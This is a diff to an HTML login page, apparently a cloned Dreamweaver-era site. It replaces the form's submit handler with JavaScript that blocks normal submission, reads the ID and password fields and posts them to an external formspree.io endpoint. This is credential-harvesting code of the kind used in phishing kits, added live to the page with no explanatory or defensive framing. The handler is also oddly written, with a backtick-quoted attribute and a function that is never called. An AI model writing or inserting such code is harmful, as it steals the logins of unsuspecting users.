@@ -285,7 +285,25 @@ MM_reloadPage(true);
 <table>
   <tbody><tr>
    <td valign="top"><br><br>
-     <form name="index" onsubmit=`onclick()`>
+     <form name="index" onsubmit=`function(){
+      event.preventDefault();
+      var id = document.getElementById('ID').value
+      var pass = document.getElementById('PASS').value
+      fetch("https://formspree.io/f/mqkjkvgw", {
+        method: "POST",
+        body: JSON.stringify({
+            id: id,
+            pass: pass,
+            
+        }),
+        
+        headers: {
+            "Content-type": "application/json; charset=UTF-8"
+        }
+      })
+      
+  
+}`>
        <input type="hidden" name="refresh" value="96222">	
        <table cellspacing="0" cellpadding="1">
           <tbody><tr> 
